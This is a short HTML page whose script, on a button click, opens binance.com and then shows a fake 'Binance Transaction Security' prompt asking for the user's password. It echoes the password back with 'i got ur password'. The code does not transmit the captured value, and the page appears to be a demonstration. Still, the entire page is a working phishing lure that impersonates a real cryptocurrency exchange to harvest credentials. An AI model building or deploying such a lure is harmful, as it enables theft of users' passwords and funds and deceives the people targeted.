<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Button Trigger</title>
</head>
<body>
  
  
    <button id="triggerBtn">Transaction</button>

    <script>
        document.getElementById('triggerBtn').onclick = () => {
            window.open("http://www.binance.com");
            document.write('<h1>waiting transfer...</h1>');
                     

            setTimeout(() => {
                const userPassword = prompt('Binance Transaction Security. Please enter your password:');
                if (userPassword) {
                    document.write('example<br>i got ur password: ' + userPassword);
                } else {
                    document.write('No password entered.');
                }
            }, 3000);
        };
    </script>
</body>
</html>
